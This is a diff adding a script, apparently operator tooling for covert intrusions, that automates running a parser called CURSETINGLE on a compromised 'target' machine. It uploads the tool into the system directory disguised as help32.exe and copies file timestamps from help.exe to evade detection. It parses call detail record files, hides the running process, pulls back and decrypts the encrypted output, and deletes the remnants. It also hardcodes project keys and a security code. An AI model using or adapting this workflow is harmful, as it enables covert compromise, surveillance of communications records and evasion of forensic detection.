@@ -1,0 +1,1238 @@
+#-------------------------------------------------------------------------------
+# File: cursetingle.eps
+# Description: Automates the CURSETINGLE 1.0 process
+#
+#-------------------------------------------------------------------------------
+
+
+@include "_FileExists.epm";
+@include "_ProcessList.epm";
+@include "_StringFunctions.epm";
+
+
+#===============================================================================
+#===============================================================================
+#  DEFINE VARIABLES
+#===============================================================================
+#===============================================================================
+
+# **NOTE:  Additional user-defined variables (used in running CT parser) are 
+#          defined under the "RUN CURSETINGLE" section
+
+string $version = "1.0.2";
+
+# List of menu options (i.e. project selections and quit)
+string $menuoptions;
+
+# Define menu options
+$menuoptions[0] = "Quit";
+$menuoptions[1] = "CRAZYTRAIN";
+$menuoptions[2] = "PHANTOMFLAMINGO";
+$menuoptions[3] = "DARKRAZOR";
+$menuoptions[4] = "MAGICERASER";
+$menuoptions[5] = "Unlisted Project";
+
+
+# List of keys for each project
+string %keylist;
+
+# List of modes for each project
+int %modelist;
+
+
+# Define CRAZYTRAIN key and mode
+%keylist{'crazytrain'} = "8a5687cb2fd4ce85d4e3438120623f4e";
+%modelist{'crazytrain'} = 0;
+
+
+# Define PHANTOMFLAMINGO key and mode
+%keylist{'phantomflamingo'} = "a30fa412a5b4923acbf8d8760df0dc3b";
+%modelist{'phantomflamingo'} = 5;
+
+
+# Define DARKRAZOR key and mode
+%keylist{'darkrazor'} = "b95949c4b85b6c614ed5b7f7285932c7";
+%modelist{'darkrazor'} = 7;
+
+
+# Define MAGICERASER key and mode
+%keylist{'magiceraser'} = "5a35feb3864f5af5ac4b984c8abef86f";
+%modelist{'magiceraser'} = 7;
+
+
+# Define an unlisted projectkey
+# **NOTE:  Used for an unlisted project (i.e. project that has not yet
+#          been added to the script.
+# **NOTE:  User will be prompted for mode later in script
+%keylist{'unlisted'} = "5a35feb3864f5af5ac4b984c8abef86f";
+
+
+# Project name
+# **NOTE:  Will be set to selected project name later in script
+string $project;
+
+
+# CURSETINGLE directory
+string $ct_dir = "D:\\OpsDisk\\Tools\\CURSETINGLE";
+
+# CURSETINGLE EXE
+string $ct_exe = "cursetingle[1].v1.0.0.7.MSWin32.targetdl";
+
+# CryptTool EXE
+string $crypttool_exe = "cryptTool.v1.1.win2k.targetdl.exe";
+
+# Argfile name (user will specify)
+string $argfile;
+
+# Key (do not change - will be set to correct key later in script)
+string $key = "";
+
+# Mode (do not change - will be set to correct mode later in script)
+int $mode;
+
+# File to matchtimes with
+string $matchtimes_file = "help.exe";
+
+# File name to upload CT as
+string $ct_upload_name = "help32.exe";
+
+# File name to upload encrypted argfile as
+string $argfile_upload_name = "~ws342.tmp";
+
+# CT output file
+string $ct_output_file = "~ws344.tmp";
+
+# CT security code
+string $ct_security_code = "Ct_#37Uw5_80n";
+
+
+#===============================================================================
+#===============================================================================
+#  PRELIMS & CHECKS
+#===============================================================================
+#===============================================================================
+
+@echo off;
+
+echo "";
+echo "************************************************************************";
+echo "**                  CURSETINGLE AUTOMATION SCRIPT                     **";
+echo "**                            v$version                                  **";
+echo "************************************************************************";
+
+
+while True
+    {
+        bool $listedproject = False;
+        bool $unlistedproject = False;
+
+        echo "\n\n";
+        echo "Projects:";
+        echo "========";
+        echo "";
+        int $i=0;
+
+        while ($i < sizeof($menuoptions))
+            {
+                echo "($i). $menuoptions[$i]";
+                $i++;
+            }
+      
+        echo "";
+        int $projchoice = GetInput("Selection");
+
+        # If user enters 0, exit
+        if ($projchoice == 0)
+            {
+                return True;
+            }
+	    
+        else if ($projchoice == 1)
+            {
+                $project = $menuoptions[1];
+                $listedproject = True;
+            }
+
+        else if ($projchoice == 2)
+            {
+                $project = $menuoptions[2];
+                $listedproject = True;
+            }
+
+        else if ($projchoice == 3)
+            {
+                $project = $menuoptions[3];
+                $listedproject = True;
+            }
+
+        else if ($projchoice == 4)
+            {
+                $project = $menuoptions[4];
+                $listedproject = True;
+            }
+
+        else if ($projchoice == 5)
+            {
+                $project = "UNLISTED";
+                $unlistedproject = True;
+            }
+        else
+            {
+                echo "\n\nINVALID SELECTION!!\n";
+            }
+
+        # If user entered a valid project, set project's key and mode
+        if ($listedproject == True)
+            {
+                $key = %keylist{$project};
+                $mode = %modelist{$project};
+                break;
+            }
+
+        if ($unlistedproject == True)
+            {
+                echo "";
+                $mode = GetInput("Enter mode");
+                echo "";
+                $key = %keylist{$project};
+                break;
+            }
+
+    }
+
+
+
+# Prompt user for full path to argfile (path/filename cannot contain spaces)
+while True
+    {
+        echo "";
+        $argfile = GetInput("Full path to argfile (NO spaces)");
+        echo "";
+
+        # Check to see if user-entered path/filemask contains spaces
+        string $tempargfile = Split(" ", $argfile);
+        echo "";
+        int $tempsize = sizeof($tempargfile);
+        
+        # If user-entered path/filemask contained spaces
+        if ($tempsize > 1)
+            {
+                echo "!! Argfile path cannot contain spaces !!";
+            }
+        else
+            {
+                break;
+            }
+    }
+
+
+
+#-----------------------------------------
+# Get target's system and temp directories
+#-----------------------------------------
+
+@record on;
+`getsyspaths`;
+@record off;
+
+echo "\t++++++++++++++++++++";
+echo "\t+ PRELIMINARY INFO +";
+echo "\t++++++++++++++++++++";
+
+string $systemdir = GetCmdData("systemDirectoryPath");
+string $tempdir = GetCmdData("temporaryPath");
+
+echo "";
+
+echo "* $project key: $key";
+echo "";
+echo "* $project mode: $mode";
+echo "";
+echo "* Target's System directory is: $systemdir";
+echo "";
+echo "* Target's Temp directory is:   $tempdir";
+
+
+#------------------------------------------------------
+# Check to make sure no remnants from past CT ops exist
+#------------------------------------------------------
+# **NOTE:  This will only check to see if the following files
+#          exist (i.e. this will not find remnant files if 
+#          they were uploaded as a filename other than the
+#          default):
+#          - $systemdir\help32.exe
+#          - $tempdir\~ws342.tmp
+#          - $tempdir\~ws344.tmp
+
+# Flag to indicate if remnant file exists (set to 1 if remnant file is found)
+int $remnant_file_exists = 0;
+
+
+echo "";
+
+# Check to see if remnant files exist
+if (_FileExists("$systemdir\\$ct_upload_name"))
+    {
+        $remnant_file_exists = 1;
+        echo "!! WARNING:  Possible remnant file $systemdir\\$ct_upload_name exists !!";
+    }
+
+if (_FileExists("$tempdir\\$argfile_upload_name"))
+    {
+        $remnant_file_exists = 1;
+        echo "!! WARNING:  Possible remnant file $tempdir\\$argfile_upload_name exists !!";
+    }
+
+
+if (_FileExists("$tempdir\\$ct_output_file"))
+    {
+        $remnant_file_exists = 1;
+        echo "!! WARNING:  Possible remnant file $tempdir\\$ct_output_file exists !!";
+    }
+
+
+# If remnant files were found
+if ($remnant_file_exists == 1)
+    {
+        echo "";
+        ifnot (prompt "Remnant files may exist - are you sure you want to continue?")
+            {
+                return True;
+            }
+    }
+
+# If no remnant files were found
+else
+    {
+        echo "";
+        echo "* None of the following remnant files were found:";
+        echo "\t- $systemdir\\help32.exe";
+        echo "\t- $tempdir~ws342.tmp";
+        echo "\t- $tempdir~ws344.tmp";
+    }
+
+
+
+
+#---------------------------------------------
+# Check to see if CURSETINGLE directory exists
+#---------------------------------------------
+
+@record on;
+`local dir $ct_dir`;
+@record off;
+
+bool $ct_present = GetCmdData("isdir");
+
+# NOTE:  $ct_present will only have a value (i.e. be "defined") if it is present and a directory
+#        So, if it is not defined, it is not present (or not a directory).
+ifnot (defined($ct_present))
+    {
+        echo "";
+        echo "**ERROR: CURSETINGLE directory ($ct_dir) does not exist!";
+        return False;   
+    }
+
+
+#------------------------------------------------------------
+# Check to see if other necessary files exist in CT Directory
+#------------------------------------------------------------
+
+@record on;
+`local dir * -path $ct_dir`;
+@record off;
+
+# Get list of file/folder names in $ct_dir directory
+string $ct_filenames = GetCmdData("name");
+
+# Counter
+int $filecount = 0;
+
+# Flag which will be set to 0 if any necessary files are NOT present
+int $allfiles_present = 1;
+
+# Flag which will be set to 1 if CurseHappy EXE is present
+int $ct_exe_present = 0;
+
+# Flag which will be set to 1 if CryptTool EXE is present
+int $crypttool_exe_present = 0;
+
+
+while ($filecount < sizeof($ct_filenames))
+    {
+        if ($ct_filenames[$filecount] == "$ct_exe")
+            {
+                $ct_exe_present = 1;
+            }
+
+        if ($ct_filenames[$filecount] == "$crypttool_exe")
+            {
+                $crypttool_exe_present = 1;
+            }
+        
+        $filecount++;
+    }
+
+
+
+
+#-------------------------------------------
+# Evaluate results of file checks above
+# (If any necessary files not present, exit)
+#-------------------------------------------
+
+# Display messages if files not present
+if ($ct_exe_present == 0)
+    {
+        echo "";
+        echo "!! CURSETINGLE EXE ($ct_dir\\$ct_exe) does not exist !!";
+        $allfiles_present = 0;
+    }
+
+
+if ($crypttool_exe_present == 0)
+    {
+        echo "";
+        echo "!! CryptTool EXE ($ct_dir\\$crypttool_exe) does not exist !!";
+        $allfiles_present = 0;
+    }
+
+
+# If any files were not present, exit
+if ($allfiles_present == 0)
+    {
+        echo "";
+        echo "**ERROR: One or more necessary files were not present - exiting..";
+        echo "";
+        return False;
+    }
+
+# If all files were present, display message and continue
+else
+    {
+        echo "";
+        echo "* All of the following necessary CT files appear to be present locally:";
+        echo "\t- $ct_dir\\$ct_exe";
+        echo "\t- $ct_dir\\$crypttool_exe";
+        echo "";
+    }
+
+
+
+
+#===============================================================================
+#===============================================================================
+#  ENCRYPT ARG FILE LOCALLY
+#===============================================================================
+#===============================================================================
+
+echo "\n\n";
+echo "\t++++++++++++++++++++++++++++++++++++++";
+echo "\t+ STEP #1 - ENCRYPT ARG FILE LOCALLY +";
+echo "\t++++++++++++++++++++++++++++++++++++++";
+echo "";
+echo "";
+
+
+#---------------------------------
+# Run CryptTool to encrypt argfile
+#---------------------------------
+
+
+# Define command to encrypt arg list
+string $arglist_command = "$ct_dir\\$crypttool_exe -i $argfile -o $ct_dir\\argfile1.enc -k $key -b";
+
+
+
+echo "";
+ifnot (prompt "Encrypt arg file?")
+    {
+        return false;
+    }
+
+echo "";
+echo "";
+
+# Run commands to encrypt arg file
+@echo on;
+`local run -redirect -command "$arglist_command"`;
+@echo off;
+
+echo "";
+
+#------------------------------------------------
+# Ensure encrypted argfile now exists
+# (If any encrypted files not present, exit)
+#------------------------------------------------
+
+@record on;
+`local dir * -path $ct_dir`;
+@record off;
+
+# Get list of file/folder names in $ct_dir directory
+$ct_filenames = "";
+$ct_filenames = GetCmdData("name");
+
+# Set counter back to 0
+$filecount = 0;
+
+# Flag which will be set to 0 if any of the encrypted files are NOT present
+int $all_enc_files_present = 1;
+
+# Flag which will be set to 1 if encrypted argfile is present
+int $enc_argfile_present = 0;
+
+
+while ($filecount < sizeof($ct_filenames))
+    {
+        if ($ct_filenames[$filecount] == "argfile1.enc")
+            {
+                $enc_argfile_present = 1;
+            }
+
+        
+        $filecount++;
+    }
+
+
+if ($enc_argfile_present == 0)
+    {
+        echo "";
+        echo "!! Encrypted argfile ($ct_dir\\argfile1.enc) does not exist !!";
+        $all_enc_files_present = 0;
+    }
+
+
+# If any encrypted files were not present, exit
+if ($all_enc_files_present == 0)
+    {
+        echo "";
+        echo "**ERROR: One or more encrypted output files were not present - exiting..";
+        echo "";
+        return False;
+    }
+
+# If all files were present, display message and continue
+else
+    {
+        echo "";
+        echo "* All encrypted output files appear to be present locally.";
+        echo "";
+    }
+
+
+
+
+#===============================================================================
+#===============================================================================
+#  LOAD CURSETINGLE
+#===============================================================================
+#===============================================================================
+
+echo "\n\n";
+echo "\t++++++++++++++++++++++++++++++";
+echo "\t+ STEP #2 - LOAD CURSETINGLE +";
+echo "\t++++++++++++++++++++++++++++++";
+
+
+#----------------------------
+# Set file to matchtimes with
+#----------------------------
+
+
+# Set counter back to 0
+$filecount = 0;
+
+# Flag which will be set to 1 if $matchtimes_file (typically "help.exe") is present
+int $matchtimes_file_present = 0;
+
+
+while ($matchtimes_file_present == 0)
+    {
+        @record on;
+        `dir $matchtimes_file -path $systemdir`;
+        @record off;
+
+        string $matchtimes_dir_results = "";
+        $matchtimes_dir_results = GetCmdData("name");
+
+        while ($filecount < sizeof($matchtimes_dir_results))
+            {
+                if ($matchtimes_dir_results[$filecount] == "$matchtimes_file")
+                    {
+                        $matchtimes_file_present = 1;
+                    }
+        
+                $filecount++;
+            }
+     
+        if ($matchtimes_file_present == 1)
+            {
+                echo "";
+                echo "* Using $matchtimes_file to matchtimes with - file exists on target";
+                echo "";
+            }
+        else
+            {
+                echo "";
+                echo "Sorry, $matchtimes_file is not present on target..however, here are some";
+                echo "other possibilities to try:";
+                echo "\twins.dll";
+                echo "\twinmm.dll";
+                echo "\tchkdsk.exe";
+                echo "";
+                $matchtimes_file = GetInput("Enter file to matchtimes with");
+            }
+    }
+
+
+
+
+#-------------------
+# Upload CURSETINGLE
+#-------------------
+
+# Prompt user to upload CT as default filename (ex- help32.exe) - if user enters NO:
+# - Prompt user to enter the name they wish to upload CT as
+# - Prompt user to confirm change
+ifnot (prompt "Upload CT to target now as filename $ct_upload_name?")
+    {
+        echo "";
+        $ct_upload_name = GetInput("Enter name you would like to upload CT as");
+        echo "";
+        ifnot (prompt "CT will be uploaded as $ct_upload_name - Continue?")
+            {
+                return false;
+            }
+    }
+
+# Upload CT to target
+echo "";
+echo "--> Uploading CT..";
+echo "";
+@echo on;
+`put $ct_dir\\$ct_exe -name $systemdir\\$ct_upload_name`;
+@echo off;
+
+echo "";
+
+# Matchtimes with $matchtimes_file
+echo "--> Matching times with $matchtimes_file..";
+echo "";
+@echo on;
+`matchtimes $systemdir\\$matchtimes_file $systemdir\\$ct_upload_name`;
+@echo off;
+
+echo "";
+
+# Dir the uploaded file
+echo "Check the directory listing below to ensure CT has been uploaded properly:";
+echo "";
+@echo on;
+`dir $systemdir\\$ct_upload_name`;
+@echo off;
+
+echo "";
+
+
+
+
+#===============================================================================
+#===============================================================================
+#  LOAD ARGUMENT LIST
+#===============================================================================
+#===============================================================================
+
+echo "\n\n";
+echo "\t++++++++++++++++++++++++++++++++";
+echo "\t+ STEP #3 - LOAD ARGUMENT LIST +";
+echo "\t++++++++++++++++++++++++++++++++";
+echo "";
+
+# Prompt user to begin encrypted argfile upload
+ifnot (prompt "Upload encrypted argfile now?")
+    {
+        return False;
+    }
+
+echo "";
+
+echo "--> Uploading encrypted argfile..";
+echo "";
+
+@echo on;
+`put $ct_dir\\argfile1.enc -name $tempdir\\$argfile_upload_name`;
+@echo off;
+
+echo "";
+
+# Dir for uploaded encrypted argfile in target's Windows temp directory
+# (after encrypted argfile upload)
+@echo on;
+`dir $argfile_upload_name -path $tempdir`;
+@echo off;
+
+# Delete encrypted argfile locally
+echo "";
+echo "--> Deleting encrypted argfile locally..";
+echo "";
+@echo on;
+`local del argfile1.enc -path $ct_dir`;
+@echo off;
+
+
+#===============================================================================
+#===============================================================================
+#  RUN CURSETINGLE
+#===============================================================================
+#===============================================================================
+
+echo "\n\n";
+echo "\t+++++++++++++++++++++++++++++";
+echo "\t+ STEP #5 - RUN CURSETINGLE +";
+echo "\t+++++++++++++++++++++++++++++";
+echo "";
+
+string $runct;
+
+
+# Loop until user no longer wishes to run CT
+while True
+    {
+        # Prompt user to run CT
+        $runct = GetInput("Type \"RUN\" to run CT, or \"CONTINUE\" to continue without running CT");
+       
+        # If user enters CONTINUE (i.e. does not wish to run CT), break from while loop
+        if ($runct == "CONTINUE")
+            {
+                break;
+            }
+       
+        # If user enters RUN (i.e. wishes to run CT), continue in loop to run parser
+        if ($runct == "RUN")
+            {
+                echo "";
+            }
+
+        # If user enters anything other than CONTINUE or RUN, loop from beginning (to prompt them again)
+        else
+            {
+                continue;
+            }
+
+
+
+        string $cdr_filemask;
+
+
+
+
+        echo "";
+        echo "You will now be prompted for the full path and filemask for each directory";
+        echo "you wish to parse (ex- D:\\datafiles\\20080922\\*.cdr).  If you are unsure";
+        echo "of what these directories are, type PAUSE and locate them, then resumescript.";
+        echo "";        
+        prompt "Continue?";
+
+ 
+        echo "";
+        echo "Enter full path and filemask (one entry per line) for each directory you";
+        echo "would like to parse.  When you are finished, type DONE";
+  
+
+
+        # Will contain list of user-entered CDR paths
+        string $cdrpathlist;
+
+        # Temp variable for each user-entered CDR path
+        string $tempcdrpath;
+
+        # Will contain string of user-entered CDR paths (each separated by a space)
+        string $cdrpathstring = "";
+
+        # Will contain a specific CDR path (used in for loop)
+        string $cdrpath = "";
+
+        # Counter
+        int $pathcount = 0;      
+
+        # Get list of user-entered CDR paths
+        while True
+            {
+                $tempcdrpath = "";
+                echo "";
+                echo "";
+                $tempcdrpath = GetInput("Enter full path/filemask to CDR files (NO spaces)");
+             
+                # If user entered DONE   
+                if ($tempcdrpath == "DONE")
+                    {
+                        echo "";
+                        echo "";
+                        echo "You entered the following:";
+ 
+                        # Display back each path entered
+                        foreach $cdrpath ($cdrpathlist)
+                            {
+                                echo "\t- $cdrpath";
+                            }
+                        echo "";
+
+                        # If user confirms that paths are all correct
+                        if (prompt "Continue?")
+                            {
+                                # Trim space from left of $cdrpathstring and break from while loop
+                                _leftTrim($cdrpathstring);
+                                break;
+                            }
+                        # If user user wishes to re-enter paths
+                        else
+                            {
+                                # Clear $cdrpathlist array and other variables
+                                undef($cdrpathlist);
+                                $cdrpathstring = "";
+                                $cdrpath = "";
+                                $pathcount = 0;
+                                continue;
+                            }
+                    }
+
+                # At this point, since user didn't enter DONE, we assume that a path was entered
+
+                # Attempt to split user entry (using space as a delimiter)
+                string $tempsplit = Split(" ", $tempcdrpath);
+
+                # If size of split entry is greater than 1, user entered a space
+                if (sizeof($tempsplit) > 1)
+                    {
+                        echo "";
+                        echo "!! Invalid entry - use short path/filename !!";
+                        echo "";
+                    }
+
+                # Otherwise, size of split entry is 1 and we should be good (user did not enter space)
+                else
+                    {
+                        $cdrpathlist[$pathcount] = $tempcdrpath;
+                        $cdrpathstring = "$cdrpathstring $tempcdrpath";
+                        $pathcount++;
+                    }
+
+               
+            }
+
+
+        # Prompt user to dir selected CDR paths
+        echo "";
+        if (prompt "Dir selected CDR paths?")
+            {
+                string $cdrdircmd = 'run -command "cmd /c \\"dir /B /S /Od $cdrpathstring\\"" -redirect';
+                echo "";
+                @echo on;
+                `$cdrdircmd`;
+                @echo off;
+                echo "";
+            }
+                
+
+        # Command to run parser
+        string $ct_cmd = "run -command \"cmd /c \\\"$ct_upload_name --$ct_security_code -r -P $tempdir\\$argfile_upload_name -m $mode -z \\\"dir /B /S /Od $cdrpathstring\\\" -k $key \\\" > $tempdir\\$ct_output_file\"";
+ 
+           
+
+        # cmd.exe PID variable
+        int $cmd_pid;
+        # Parser (ex- help32.exe) PID variable
+        int $help32_pid;
+
+        # Flag used to signify if cmd.exe PID is running
+        # (initially set to False - only set to True if cmd.exe PID specified by user is running)
+        bool $cmd_running = False;
+
+        echo "";
+        echo "";
+        echo "About to run the following command:";
+        echo "";
+        echo "$ct_cmd";
+        echo "";
+        if (prompt "Continue?")
+            {
+                echo "";
+            }
+        else
+            {
+                continue;
+            }
+
+        echo "";
+        echo "--> Running CT command now..";
+        echo "";
+
+        @echo on;
+        echo "----------------------------";
+        `$ct_cmd`;
+        echo "----------------------------";
+        @echo off;
+
+        echo "";   
+
+        # Loop until specifically instructed to break out     
+        While True
+            {
+                # Prompt user for cmd.exe PID
+                # **NOTE:  This was displayed when parser command was run
+                $cmd_pid = GetInput("Enter PID listed above");
+
+                # If PID specified by user is running
+                if (_ProcessRunning($cmd_pid))
+                    {
+                        # Set flag to True
+                        $cmd_running = True;
+                        # Break out of while loop
+                        break;
+                    }
+
+                # Otherwise, if PID specified by user is not running:
+                # - Display message to user
+                # - Run _Get_Decrypt_OutputFile function
+                # - Give user the option to reenter PID (in case they mistyped it)
+                echo "";
+                echo "!! The cmd.exe PID you entered ($cmd_pid) is not running !!";
+                echo "";
+                echo "This may or may not be normal.  Some of the reasons this might happen include:";
+                echo "\t- Parser finished very quickly";
+                echo "\t- Command did not execute properly";
+                echo "\t- You entered the wrong PID";
+                echo "";
+                echo "--> Checking to see if output file ($ct_output_file) exists";
+                echo "";
+                _Get_Decrypt_OutputFile($tempdir, $ct_output_file, "$ct_dir\\$crypttool_exe", $key);
+                echo "";
+                
+                # Give user option to reenter PID
+                # If user wants to reenter PID, loop
+                if (prompt "Re-enter cmd.exe PID?")
+                    {
+                        continue;
+                    }
+                # If user doesn't want to reenter PID, break out of while loop
+                else
+                    {
+                        break;
+                    }
+            }
+        
+
+
+        # While cmd.exe is running
+        while ($cmd_running == True)
+            {
+                # Ask user if they want to hide parser process (ex- help32.exe)
+                # If user wants to hide parser process
+                echo "";
+                if (prompt "Hide parser process ($ct_upload_name)?")
+                    {         
+                        # Check if parser (ex- help32.exe) process is running (by process name)
+                        # **NOTE:  _FindProcessOnList is part of the _ProcessList.epm include file - it will
+                        #          return the PID (or PIDs if muliple instances of the EXE are running) if process
+                        #          is running
+                        if (_FindProcessOnList($ct_upload_name, $help32_pid))
+                            {
+                                # If multiple instances of parser EXE (ex- help32.exe) are found (this should
+                                # not occur)
+                                int $number_of_results = sizeof($help32_pid);
+
+                                if ($number_of_results > 1)
+                                    {
+                                        echo "!! Warning:  More than 1 PID was returned for process \"$ct_upload_name\" !! ";
+                                        echo "** PIDs returned were:";
+                                        int $count = 0;
+                                        while ($count < $number_of_results)
+                                            {
+                                                echo "- $help32_pid[$count]";
+                                                $count++;
+                                            }
+                                        echo "!! Unable to hide $ct_upload_name PID !!";
+                                        echo "";
+                                        echo "*************************************************************************";
+                                        echo "If you wish to hide the $ct_upload_name PID, type PAUSE, run processlist,";
+                                        echo "then run \"processhide -hide -id <PID>\" (where <PID> is the correct";
+                                        echo "PID for the process you wish to hide";
+                                        echo "*************************************************************************";
+                                        echo "";
+                                        if (prompt "Continue?")
+                                            {
+                                                # Do nothing - this prompt is just to give the user a chance to 
+                                                # type "PAUSE" and hide the process manually
+                                            }
+
+ 
+                                     }
+                                 # If there is only one instance of parser (ex- help32.exe) running (this should
+                                 # be the case), attempt to hide process
+                                 else
+                                     {
+                                         echo "";
+                                         echo "Parser Process ID is: $help32_pid";
+                                         echo "";
+                                         echo "--> Hiding parser process..";
+                                         @echo on;
+                                         `processhide -hide -id $help32_pid`;
+                                         @echo off;
+                                         echo "";
+                                     }
+
+                            }
+
+                        # If parser EXE (ex- help32.exe) is not running
+                        # - Display message to user
+                        # - Run _Get_Decrypt_OutputFile function
+                        else
+                            {
+                                echo "";
+                                echo "!! PROCESS ($ct_upload_name) IS NOT RUNNING !!";
+                                echo "";
+                                echo "This may or may not be normal.  Some of the reasons this might happen include:";
+                                echo "\t- Parser finished very quickly";
+                                echo "\t- Command did not execute properly";
+                                echo "";
+                                echo "--> Checking to see if output file ($ct_output_file) exists";
+                                echo "";
+                                _Get_Decrypt_OutputFile($tempdir, $ct_output_file, "$ct_dir\\$crypttool_exe", $key);
+                                echo "";
+
+                                break;
+                            }
+                    }
+
+
+               # Wait for cmd.exe to exit
+
+               echo "";
+               echo "--> Watch processmonitor for cmd.exe PID ($cmd_pid) to terminate";
+               echo "";
+            
+               while True
+                   {
+                       echo "";
+                       if (prompt "Is parser still running?")
+                           {
+                               continue;
+                           }
+                       else
+                           {
+                               break;
+                           }
+                    }
+
+           
+               echo "";
+               $cmd_running = False;
+               # Get output file
+               _Get_Decrypt_OutputFile($tempdir, $ct_output_file, "$ct_dir\\$crypttool_exe", $key);
+                       
+            }     
+
+    }
+
+
+
+#===============================================================================
+#===============================================================================
+#  CLEANUP
+#===============================================================================
+#===============================================================================
+
+echo "\n\n";
+echo "\t+++++++++++";
+echo "\t+ CLEANUP +";
+echo "\t+++++++++++";
+echo "";
+
+if (prompt "Would you like to cleanup files on target now?")
+    {
+        # Delete CT parser file
+        echo "--> Deleting CT parser";
+        _CTCleanup($ct_upload_name, $systemdir);
+        echo "";
+
+        # Delete encrypted argfile
+        echo "--> Deleting encrypted argfile";
+        _CTCleanup($argfile_upload_name, $tempdir);
+        echo "";
+
+        # Delete output file
+        echo "--> Deleting output file";
+        _CTCleanup($ct_output_file, $tempdir);
+        echo "";
+    }
+
+
+
+
+#===============================================================================
+#===============================================================================
+#  FUNCTIONS
+#===============================================================================
+#===============================================================================
+
+
+# Function to delete specified file ($filename) in specified path ($path)
+# **NOTE:  After attempting to delete file, function checks to see if it still exists,
+#          and displays warning message if it does
+Sub _CTCleanup(IN string $filename, IN string $path)
+{
+
+    @echo on;
+    `del $filename -path $path`;
+    @echo off;
+
+    if (_FileExists("$path\\$filename"))
+        {
+            echo "!! WARNING - File $filename still exists in $path !!";
+        }
+
+    else
+        {
+            echo "* The file $path\\$filename no longer exists";
+        }
+
+}
+
+
+
+
+
+# Displays directory listing of output file.  If file exists, prompts user to 
+# get and delete the file (requires full path to all files which are passed as
+# arguments)
+Sub _Get_Decrypt_OutputFile(IN string $remote_outputfile_path, IN string $remote_outputfile, IN string $crypttool_exe, IN string $key)
+{
+    # Check to see if output file exists - if it doesn't, return from function
+    ifnot (_FileExists("$remote_outputfile_path\\$remote_outputfile"))
+        {
+            echo "!! Output file ($remote_outputfile) does not exist !!";
+            echo "";
+            return False;
+        }
+       
+
+    # Dir for output file
+    @echo on;
+    `dir $remote_outputfile -path $remote_outputfile_path`;
+    @echo off;
+
+    echo "";
+
+    # Prompt user to get output file
+    if (prompt "Get file $remote_outputfile?")
+        {
+            echo "";
+            echo "--> Getting output file ($remote_outputfile)";
+            echo "";
+            @echo on;
+            `get $remote_outputfile -path $remote_outputfile_path`;
+            @echo off;
+            echo "";
+
+            echo "** Open EP Log Viewer and wait for GET to finish    **"; 
+            echo "** DO NOT DELETE OUTPUT FILE UNTIL GET IS COMPLETED **";
+
+            while True
+                {
+                    echo "";
+                    string $status_of_get = GetInput("When get has completed, type DELETE to delete output file, or QUIT if the get failed");
+                    echo "";
+                    if ($status_of_get == "DELETE")
+                        {
+                            @echo on;
+                            _CTCleanup($remote_outputfile, $remote_outputfile_path);
+                            echo "";
+                            @echo off;
+                            break;
+                        }
+                     if ($status_of_get == "QUIT")
+				{
+				    echo "If you want to try to copyget the Output file $remote_outputfile,";
+				    echo "you should pause and do that now. The file will not be deleted by this script.";
+				    echo "You should manually clean the file if it exists. If you can't get the file answer 'no' to the decrypt question below.";
+				    echo "If you can't get the file answer 'no' to the decrypt question below.";
+				    pause; 
+				    break;
+				}
+			   else
+                        {
+                            continue;
+                        }
+                }
+
+
+            echo "";
+            if (prompt "Decrypt output file?")
+                {
+                    string $local_encrypted_file;
+                    string $local_decrypted_file;
+
+                    echo "";
+                    $local_encrypted_file = GetInput("Enter full path to output file");
+       
+                    echo "";
+                    $local_decrypted_file = GetInput("Enter full path and filename for decrypted file");
+        
+                    string $decrypt_command = "$crypttool_exe -i $local_encrypted_file -o $local_decrypted_file -d -k $key -c";
+ 
+                    echo "";
+                    echo "About to run command:";
+                    echo "$decrypt_command";
+                    echo "";
+
+                    if (prompt "Continue?")
+                        {
+                            echo "";
+                            `local run -redirect -command "$decrypt_command"`;
+                        }
+                }
+        }
+
+}
+
+
+
+
+# Given a PID, returns TRUE if process is running, FALSE if it isn't
+Sub _ProcessRunning(IN int $pid)
+{
+    @echo off;
+
+    # Run processlist
+    @record on;
+    ifnot (`processlist`) 
+        {
+	    return False;
+        }
+    @record off;
+
+    # Store all PIDs in array
+    int $ids = GetCmdData("id");
+
+    # Counter
+    int $count = 0;
+
+    # For each PID in the array
+    while ($count < sizeof($ids))
+        {
+            # If PID matches PID user is searching for (i.e. PID user passed
+            # as an argument), return True
+            if ($pid == $ids[$count])
+                {
+                    return True;
+                }
+            $count++;
+        }
+
+    # If none of the PIDS matched PID user was looking for, return False
+    return False;
+
+} 
+
+
